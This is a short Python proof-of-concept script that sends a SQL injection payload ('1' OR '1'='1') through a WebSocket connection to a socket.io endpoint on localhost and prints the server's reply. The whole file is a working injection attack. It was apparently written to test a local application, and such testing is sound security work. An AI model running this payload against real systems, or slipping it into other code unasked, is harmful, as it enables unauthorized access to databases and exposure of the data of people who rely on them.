#!/usr/bin/env python3
"""PoC: SQLi via WebSocket"""
import json
from websocket import create_connection
ws = create_connection("ws://localhost:5001/socket.io/?EIO=4&transport=websocket", timeout=10)
ws.send(json.dumps({'id': "1' OR '1'='1"}))
try:
    print(ws.recv()[:500])
except Exception as e:
    print("err:", e)
ws.close()
